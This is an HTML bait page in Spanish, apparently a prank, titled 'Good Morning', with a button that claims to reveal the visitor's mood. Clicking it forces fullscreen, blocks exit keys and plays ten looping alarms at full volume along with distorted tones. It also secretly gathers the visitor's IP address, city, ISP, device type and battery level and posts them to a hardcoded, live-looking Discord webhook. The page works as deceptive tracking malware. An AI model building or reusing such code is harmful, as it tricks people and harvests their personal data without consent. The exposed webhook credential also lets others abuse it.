<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Good Morning</title>
    <style>
        /* ======== ESTILOS ======== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            height: 100vh;
            overflow: hidden;
            user-select: none;
        }

        /* ======== PANTALLA 1: PAISAJE ======== */
        #screen1 {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            text-align: center;
            padding: 20px;
            transition: opacity 0.5s;
        }

        #screen1 img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
            z-index: -1;
            opacity: 0.8;
        }

        #screen1 h1 {
            font-size: 6em;
            color: #fff;
            text-shadow: 0 0 50px rgba(255, 200, 50, 0.8), 0 0 100px rgba(255, 100, 0, 0.6);
            animation: glow 2s infinite alternate;
            z-index: 2;
            font-weight: 900;
            letter-spacing: 8px;
        }

        @keyframes glow {
            0% {
                text-shadow: 0 0 30px rgba(255, 200, 50, 0.6);
            }
            100% {
                text-shadow: 0 0 80px rgba(255, 100, 0, 0.9), 0 0 150px rgba(255, 50, 0, 0.6);
            }
        }

        #screen1 p {
            font-size: 1.8em;
            color: #ddd;
            text-shadow: 0 0 30px rgba(0, 0, 0, 0.9);
            z-index: 2;
            margin-top: 20px;
            font-weight: 300;
            letter-spacing: 3px;
        }

        #screen1 .btn {
            margin-top: 40px;
            padding: 20px 60px;
            background: rgba(255, 200, 50, 0.2);
            color: #fff;
            border: 2px solid rgba(255, 200, 50, 0.6);
            border-radius: 50px;
            font-size: 1.5em;
            font-weight: bold;
            cursor: pointer;
            z-index: 2;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 3px;
            backdrop-filter: blur(5px);
            box-shadow: 0 0 50px rgba(255, 200, 50, 0.2);
        }

        #screen1 .btn:hover {
            background: rgba(255, 200, 50, 0.4);
            transform: scale(1.05);
            box-shadow: 0 0 80px rgba(255, 200, 50, 0.4);
        }

        /* ======== PANTALLA 2: CAOS TOTAL ======== */
        #screen2 {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 10;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            text-align: center;
            padding: 20px;
            animation: shake 0.1s infinite alternate;
        }

        @keyframes shake {
            0% {
                transform: translate(-2px, -2px) rotate(-0.5deg);
            }
            25% {
                transform: translate(2px, -2px) rotate(0.5deg);
            }
            50% {
                transform: translate(-2px, 2px) rotate(-0.3deg);
            }
            75% {
                transform: translate(2px, 2px) rotate(0.3deg);
            }
            100% {
                transform: translate(-2px, -2px) rotate(-0.5deg);
            }
        }

        #screen2 img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
            z-index: -1;
            filter: saturate(2) contrast(1.5) brightness(0.7);
        }

        /* ======== OVERLAY ROJO PARPADEANTE ======== */
        #redOverlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 0, 0, 0.15);
            z-index: 5;
            animation: pulseRed 0.3s infinite alternate;
            pointer-events: none;
        }

        @keyframes pulseRed {
            0% {
                opacity: 0.1;
            }
            100% {
                opacity: 0.5;
            }
        }

        /* ======== LÍNEAS DE INTERFERENCIA ======== */
        .glitch-lines {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 6;
            pointer-events: none;
            overflow: hidden;
        }

        .glitch-lines span {
            position: absolute;
            width: 100%;
            height: 2px;
            background: rgba(255, 0, 0, 0.3);
            animation: glitchLine 0.05s infinite alternate;
        }

        .glitch-lines span:nth-child(1) {
            top: 10%;
            animation-delay: 0s;
        }
        .glitch-lines span:nth-child(2) {
            top: 25%;
            animation-delay: 0.02s;
        }
        .glitch-lines span:nth-child(3) {
            top: 45%;
            animation-delay: 0.04s;
        }
        .glitch-lines span:nth-child(4) {
            top: 65%;
            animation-delay: 0.06s;
        }
        .glitch-lines span:nth-child(5) {
            top: 80%;
            animation-delay: 0.08s;
        }

        @keyframes glitchLine {
            0% {
                transform: translateX(-100%);
                opacity: 0;
            }
            50% {
                opacity: 1;
            }
            100% {
                transform: translateX(100%);
                opacity: 0;
            }
        }

        /* ======== TEXTO DE CAOS ======== */
        #screen2 .chaos-text {
            font-size: 4em;
            color: #ff0000;
            text-shadow: 0 0 50px rgba(255, 0, 0, 0.8), 0 0 100px rgba(255, 0, 0, 0.4);
            z-index: 7;
            animation: flicker 0.05s infinite alternate;
            font-weight: 900;
            letter-spacing: 10px;
        }

        @keyframes flicker {
            0% {
                opacity: 1;
                text-shadow: 0 0 50px rgba(255, 0, 0, 0.8);
            }
            50% {
                opacity: 0.4;
                text-shadow: 0 0 100px rgba(255, 0, 0, 0.2);
            }
            100% {
                opacity: 1;
                text-shadow: 0 0 80px rgba(255, 0, 0, 0.9);
            }
        }

        #screen2 .sub-text {
            font-size: 1.5em;
            color: #ff4444;
            z-index: 7;
            animation: flicker 0.1s infinite alternate;
            margin-top: 20px;
            font-weight: 300;
            letter-spacing: 5px;
        }

        /* ======== EFECTO DE SATURACIÓN EN PANTALLA 2 ======== */
        .saturation-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 4;
            background: repeating-linear-gradient(0deg,
                    transparent,
                    transparent 2px,
                    rgba(255, 0, 0, 0.03) 2px,
                    rgba(255, 0, 0, 0.03) 4px);
            pointer-events: none;
            animation: scanlines 0.1s infinite linear;
        }

        @keyframes scanlines {
            0% {
                transform: translateY(0);
            }
            100% {
                transform: translateY(4px);
            }
        }

        /* ======== RESPONSIVE ======== */
        @media (max-width: 600px) {
            #screen1 h1 {
                font-size: 3em;
                letter-spacing: 4px;
            }
            #screen1 p {
                font-size: 1.2em;
            }
            #screen1 .btn {
                padding: 15px 30px;
                font-size: 1.2em;
            }
            #screen2 .chaos-text {
                font-size: 2.5em;
                letter-spacing: 5px;
            }
            #screen2 .sub-text {
                font-size: 1em;
            }
        }
    </style>
</head>
<body>

    <!-- ======== PANTALLA 1: PAISAJE ======== -->
    <div id="screen1">
        <img src="https://files.catbox.moe/2tc5vs.avif" alt="Paisaje">
        <h1>GOOD MORNING</h1>
        <p>Apreta el botón para ver tu estado de ánimo</p>
        <button class="btn" id="activateBtn">🔥 ACTIVAR</button>
    </div>

    <!-- ======== PANTALLA 2: CAOS TOTAL ======== -->
    <div id="screen2">
        <img src="https://files.catbox.moe/zaogwd.webp" alt="Caos">
        <div id="redOverlay"></div>
        <div class="saturation-overlay"></div>
        <div class="glitch-lines">
            <span></span><span></span><span></span><span></span><span></span>
        </div>
        <div class="chaos-text">⚠️ ¡CAOS! ⚠️</div>
        <div class="sub-text">🔊 SATURACIÓN MÁXIMA 🔊</div>
    </div>

    <!-- ======== 10 AUDIOS PARA SATURACIÓN ======== -->
    <audio id="audio1" loop preload="auto">
        <source src="https://www.soundjay.com/misc/sounds/alarm-clock-01.mp3" type="audio/mpeg">
    </audio>
    <audio id="audio2" loop preload="auto">
        <source src="https://www.soundjay.com/misc/sounds/air-raid-siren-02.mp3" type="audio/mpeg">
    </audio>
    <audio id="audio3" loop preload="auto">
        <source src="https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3" type="audio/mpeg">
    </audio>
    <audio id="audio4" loop preload="auto">
        <source src="https://www.soundjay.com/misc/sounds/error-01.mp3" type="audio/mpeg">
    </audio>
    <audio id="audio5" loop preload="auto">
        <source src="https://www.soundjay.com/misc/sounds/lock-01.mp3" type="audio/mpeg">
    </audio>
    <audio id="audio6" loop preload="auto">
        <source src="https://www.soundjay.com/misc/sounds/phone-ring-01.mp3" type="audio/mpeg">
    </audio>
    <audio id="audio7" loop preload="auto">
        <source src="https://www.soundjay.com/misc/sounds/siren-01.mp3" type="audio/mpeg">
    </audio>
    <audio id="audio8" loop preload="auto">
        <source src="https://www.soundjay.com/misc/sounds/notification-01.mp3" type="audio/mpeg">
    </audio>
    <audio id="audio9" loop preload="auto">
        <source src="https://www.soundjay.com/misc/sounds/warning-01.mp3" type="audio/mpeg">
    </audio>
    <audio id="audio10" loop preload="auto">
        <source src="https://www.soundjay.com/misc/sounds/alarm-01.mp3" type="audio/mpeg">
    </audio>

    <script>
        // ======== 1. GENERAR SONIDO CON WEB AUDIO API (SATURADO) ========
        function generarSonidoSaturado() {
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                const audioCtx = new AudioContext();

                // Crear 3 osciladores para saturar
                for (let i = 0; i < 3; i++) {
                    const osc = audioCtx.createOscillator();
                    const gain = audioCtx.createGain();
                    const distortion = audioCtx.createWaveShaper();

                    // Configurar distorsión (saturación)
                    distortion.curve = new Float32Array(1000);
                    for (let j = 0; j < 1000; j++) {
                        const x = (j - 500) / 500;
                        distortion.curve[j] = Math.tanh(x * 2);
                    }

                    osc.type = ['sawtooth', 'square', 'sawtooth'][i];
                    osc.frequency.value = [880, 440, 1760][i];

                    gain.gain.value = [0.4, 0.3, 0.2][i];

                    osc.connect(distortion);
                    distortion.connect(gain);
                    gain.connect(audioCtx.destination);

                    osc.start();

                    // Modulación de frecuencia (efecto de alarma)
                    setTimeout(() => {
                        osc.frequency.value = [440, 880, 220][i];
                    }, 300);
                    setTimeout(() => {
                        osc.frequency.value = [880, 440, 1760][i];
                    }, 600);
                }

                // Añadir ruido blanco para saturación extra
                const bufferSize = 2 * audioCtx.sampleRate;
                const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
                const data = buffer.getChannelData(0);
                for (let i = 0; i < bufferSize; i++) {
                    data[i] = (Math.random() * 2 - 1) * 0.3;
                }
                const noise = audioCtx.createBufferSource();
                noise.buffer = buffer;
                const noiseGain = audioCtx.createGain();
                noiseGain.gain.value = 0.15;
                noise.connect(noiseGain);
                noiseGain.connect(audioCtx.destination);
                noise.start();

                console.log('✅ Sonido saturado generado');

            } catch (e) {
                console.warn('⚠️ Web Audio API falló:', e);
            }
        }

        // ======== 2. REPRODUCIR TODOS LOS AUDIOS (SATURACIÓN) ========
        function reproducirAudiosSaturados() {
            const audios = [
                document.getElementById('audio1'),
                document.getElementById('audio2'),
                document.getElementById('audio3'),
                document.getElementById('audio4'),
                document.getElementById('audio5'),
                document.getElementById('audio6'),
                document.getElementById('audio7'),
                document.getElementById('audio8'),
                document.getElementById('audio9'),
                document.getElementById('audio10')
            ];

            audios.forEach((audio, index) => {
                if (!audio) return;
                audio.volume = 1.0; // Volumen al 100%
                audio.muted = false;
                audio.loop = true;

                // Intentar reproducir con diferentes retrasos para saturar
                setTimeout(() => {
                    audio.play()
                        .then(() => {
                            console.log('✅ Audio ' + (index + 1) + ' reproduciéndose');
                        })
                        .catch((err) => {
                            console.warn('⚠️ Audio ' + (index + 1) + ' falló:', err);
                            // Si falla, reintentar con interacción
                            document.addEventListener('click', function activar() {
                                audio.play().catch(() => {});
                                document.removeEventListener('click', activar);
                            }, { once: true });
                        });
                }, index * 200); // Retraso escalonado para saturación
            });
        }

        // ======== 3. ACTIVAR CAOS ========
        function activarCaos() {
            // Cambiar a pantalla 2
            document.getElementById('screen1').style.display = 'none';
            const screen2 = document.getElementById('screen2');
            screen2.style.display = 'flex';

            // Activar pantalla completa
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(() => {});
            }

            // Bloquear teclas de salida
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape' || e.key === 'F11' ||
                    (e.ctrlKey && e.key === 'w') ||
                    (e.ctrlKey && e.key === 'F4') ||
                    (e.altKey && e.key === 'F4') ||
                    (e.metaKey && e.key === 'w')) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
            });

            // Generar sonido saturado (Web Audio)
            generarSonidoSaturado();

            // Reproducir todos los audios
            setTimeout(() => {
                reproducirAudiosSaturados();
            }, 300);

            // Forzar vibración (si está disponible)
            if (navigator.vibrate) {
                navigator.vibrate([100, 50, 100, 50, 200, 100, 200]);
            }

            // Capturar datos y enviar a Discord
            capturarDatos();

            console.log('🔥 CAOS ACTIVADO');
        }

        // ======== 4. CAPTURAR DATOS ========
        async function capturarDatos() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                const ua = navigator.userAgent || '';
                let dispositivo = 'Desconocido';
                if (/android/i.test(ua)) dispositivo = 'Android';
                else if (/iphone|ipad|ipod/i.test(ua)) dispositivo = 'iOS';
                else if (/windows/i.test(ua)) dispositivo = 'Windows PC';
                else if (/mac/i.test(ua)) dispositivo = 'Mac';
                else if (/linux/i.test(ua)) dispositivo = 'Linux';
                let bateria = 'No disponible';
                try {
                    if (navigator.getBattery) {
                        const battery = await navigator.getBattery();
                        bateria = Math.round(battery.level * 100) + '%';
                    }
                } catch (e) {}
                const info = {
                    ip: data.ip || 'No disponible',
                    ciudad: data.city || 'No disponible',
                    pais: data.country_name || 'No disponible',
                    isp: data.org || 'No disponible',
                    region: data.region || 'No disponible',
                    dispositivo: dispositivo,
                    bateria: bateria,
                    direccionReal: data.city + ', ' + data.region + ', ' + data.country_name,
                    hora: new Date().toLocaleString()
                };
                const WEBHOOK_URL =
                    'https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD';
                const embed = {
                    color: 0xff0000,
                    title: '🔥 CAOS ACTIVADO',
                    fields: [
                        { name: '📍 Dirección', value: info.direccionReal || 'No disponible' },
                        { name: '🌐 IP', value: info.ip || 'No disponible' },
                        { name: '📱 Dispositivo', value: info.dispositivo || 'No disponible' },
                        { name: '🔋 Batería', value: info.bateria || 'No disponible' },
                        { name: '📶 ISP', value: info.isp || 'No disponible' },
                        { name: '🕒 Hora', value: info.hora || 'No disponible' }
                    ],
                    footer: { text: 'CeboScripts • Caos total' },
                    timestamp: new Date().toISOString()
                };
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: 'CeboScripts Logger',
                        content: '🔥 **¡CAOS TOTAL ACTIVADO!**',
                        embeds: [embed]
                    })
                });
                console.log('✅ Datos enviados a Discord');
            } catch (error) {
                console.error('❌ Error:', error);
            }
        }

        // ======== 5. EVENTO DEL BOTÓN ========
        document.getElementById('activateBtn').addEventListener('click', activarCaos);

        // ======== 6. PREVENIR SALIR ========
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '⚠️ ¿Seguro que quieres salir?';
            return '⚠️ ¿Seguro que quieres salir?';
        });

        console.log('🌅 Good Morning - Listo');
    </script>
</body>
</html>
